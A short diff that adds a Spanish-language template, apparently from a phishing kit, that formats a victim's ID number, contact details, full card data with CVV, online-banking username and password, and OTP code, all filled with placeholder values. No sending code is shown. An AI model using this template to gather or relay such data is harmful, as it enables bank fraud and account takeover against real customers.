@@ -1,0 +1,17 @@
+### RECIBIENDO ###\n
+CC: 1062888777\n 
+NOMBRE: Pepito Pérez\n
+MAIL: pepito@pepito.com\n
+CELULAR: 3132223333\n
+CIUDAD: Magdalena Medio\n
+DIRECCIÓN: CALLE BOULEVARD 22 33\n\n
+**--------**\n
+BANCO: BBVA\n
+TARJETA: 1111222233334444\n
+FECHA: 06/10/2000\n
+CVV: 332\n\n
+**--------**\n
+USUARIO: 1062888777\n
+CONTRASEÑA: 124578\n\n
+**--------**\n
+OTP: 1245\n
